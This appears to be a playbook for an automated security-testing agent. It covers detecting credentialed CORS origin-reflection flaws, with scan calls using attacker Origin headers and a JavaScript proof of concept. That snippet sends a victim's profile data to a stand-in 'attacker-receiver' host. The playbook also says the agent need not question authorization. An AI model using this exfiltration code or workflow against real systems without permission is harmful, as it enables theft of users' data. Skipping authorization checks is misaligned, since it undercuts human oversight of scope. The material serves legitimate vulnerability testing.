# C16_cors_credentials

Test CORS misconfigurations that reflect the `Origin` header into `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`. A credentialed reflected-origin CORS misconfiguration lets an attacker-controlled page make cross-origin requests with the victim's session cookies and read the response — effectively exfiltrating sensitive data or performing account-level actions. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface serves authenticated API endpoints returning sensitive data (user profile, balance, tokens, PII).
- Traffic shows `Access-Control-Allow-Origin` or `Access-Control-Allow-Credentials` response headers.
- Recon suggests the API is intended to be consumed by a specific frontend origin but the origin validation is weak.
- Bug-class hints include `cors`, `cors-misconfiguration`, `credentialed-cors`, or `cross-site-data-steal`.

---

## Workflow

1. **Load assignment and identify CORS-relevant endpoints.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   From traffic summary, find authenticated GET/POST endpoints that return sensitive data. Common targets: `/api/user/profile`, `/api/tokens`, `/api/wallet/balance`, `/api/keys`.

2. **Baseline CORS response without Origin.**
   Send a request without an `Origin` header and observe the response:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", auth_profile: "attacker", egress_profile })
   ```
   Note whether `Access-Control-Allow-Origin` appears. It should not appear for credentialed endpoints without a request `Origin`.

3. **Test arbitrary origin reflection.**
   Send the same request with an attacker-controlled `Origin`:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Origin": "https://attacker.example.com" }, auth_profile: "attacker", egress_profile })
   ```
   Check the response for:
   - `Access-Control-Allow-Origin: https://attacker.example.com` (exact reflection)
   - `Access-Control-Allow-Credentials: true`
   If both headers are present together, the misconfiguration is confirmed.

4. **Test null origin.**
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Origin": "null" }, auth_profile: "attacker", egress_profile })
   ```
   If `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true` are returned, an attacker can use a sandboxed iframe with `sandbox="allow-scripts allow-same-origin"` to send a `null`-origin credentialed request.

5. **Test subdomain wildcard.**
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Origin": "https://evil.app.example.com" }, auth_profile: "attacker", egress_profile })
   ```
   If the server validates only that the origin ends with `.example.com` (suffix match), any subdomain — including attacker-controlled ones (`evil.example.com`) — is accepted.

6. **Test trusted domain prefix.**
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Origin": "https://app.example.com.attacker.com" }, auth_profile: "attacker", egress_profile })
   ```
   If the server validates only that the origin starts with `app.example.com`, this suffix-appended origin passes.

7. **Pre-flight OPTIONS check.**
   For mutation endpoints, test CORS pre-flight:
   ```
   mantis_http_scan({ target_domain, method: "OPTIONS", path: "/api/account/email", headers: { "Origin": "https://attacker.example.com", "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "Content-Type" }, auth_profile: "attacker", egress_profile })
   ```
   If the pre-flight returns `Access-Control-Allow-Origin: https://attacker.example.com` and `Access-Control-Allow-Credentials: true`, POST mutations from attacker origin are permitted with credentials.

8. **Demonstrate data exfiltration.**
   Construct the proof-of-concept JavaScript that would run on an attacker's page:
   ```javascript
   fetch('https://app.example.com/api/user/profile', {
     credentials: 'include'
   }).then(r => r.json()).then(data => {
     fetch('https://attacker-receiver.example.com/steal?d=' + JSON.stringify(data));
   });
   ```
   Simulate execution via `mantis_http_scan` to confirm the `api/user/profile` endpoint returns sensitive data with the attacker Origin:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Origin": "https://attacker.example.com" }, auth_profile: "victim", egress_profile })
   ```
   Confirm the response body contains victim-owned sensitive data (email, token, balance, PII).

9. **Log coverage.**
   ```
   mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/api/user/profile", method: "GET", bug_class: "cors_credentialed_reflection", auth_profile: "victim", status: "promising"|"tested", evidence_summary: "Origin: attacker.example.com reflected with ACAC: true; victim profile data returned" }] })
   ```

10. **Record chain attempt.**
    ```
    mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "cors-to-data-exfil", step: "credentialed_reflection_confirmed", evidence: "ACAO: attacker.example.com + ACAC: true on /api/user/profile; victim email in response", outcome: "finding_recorded" })
    ```

11. **Record finding.**
    Call `mantis_list_findings` first:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "victim", title: "Credentialed CORS reflection — cross-site data exfiltration", severity: "high", cwe: "CWE-942", endpoint: "/api/user/profile", description: "...", proof_of_concept: "<request with attacker Origin + response headers + victim data body>", response_evidence: "...", impact: "Attacker-controlled page can read victim's profile, tokens, and PII cross-origin with cookies included", validated: true })
    ```

12. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["CORS reflection confirmed; API token exfiltrable — feeds C6 JWT bypass if token is a JWT", "Null origin accepted — iframe sandbox vector for deeper escalation"] })
    ```

13. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "cors_victim_replay", notes: "Re-send with victim auth and attacker origin; confirm ACAC header persists and data returned" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Full request with attacker `Origin` header and the full response headers (`Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`).
- Response body confirming victim-owned sensitive data is returned under the attacker origin.
- If null origin: the `null` origin request and ACAO: null response.
- If pre-flight bypassed: the OPTIONS response confirming POST mutation is allowed with attacker origin.
- PoC JavaScript that would exfiltrate the data from an attacker-controlled page.

---

## Stop conditions

- `Access-Control-Allow-Origin` is a hard-coded whitelist; no arbitrary origin reflected.
- `Access-Control-Allow-Credentials: true` is absent; credentialed cross-origin reads are blocked by browser policy.
- All sensitive endpoints return opaque responses without CORS headers; browser cannot read the response.
- `SameSite=Strict` cookies prevent cross-origin cookie attachment entirely.
- Two WAF blocks on Origin-manipulation attempts — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Wildcard without credentials.** `Access-Control-Allow-Origin: *` without `Access-Control-Allow-Credentials: true` is not exploitable for credentialed data theft (browsers block cookies with wildcard ACAO). Only report as a finding if credentials are included OR if the endpoint returns sensitive data without authentication.
- **CORS headers on non-sensitive endpoints.** CORS reflection on a public endpoint with no sensitive data is not a finding. Confirm that the accessible endpoint returns user-specific or privileged data.
- **Server-side CORS without browser context.** CORS is a browser security feature. SSRF or server-to-server requests are not affected. The attack vector requires a victim's browser executing JavaScript on an attacker-controlled page.
- **Non-simple requests blocked by pre-flight.** Even if GET is reflected, a POST mutation may require a pre-flight that is blocked. Test each method independently.

---

## Next chain

Feeds into **C12_account_takeover** (exfiltrate session token or API key and use to hijack account), **C5_idor_burst** (use CORS to probe IDOR-accessible resources cross-origin), and **C6_jwt_signer_swap** (if the exfiltrated token is a JWT, pivot to JWT attacks).
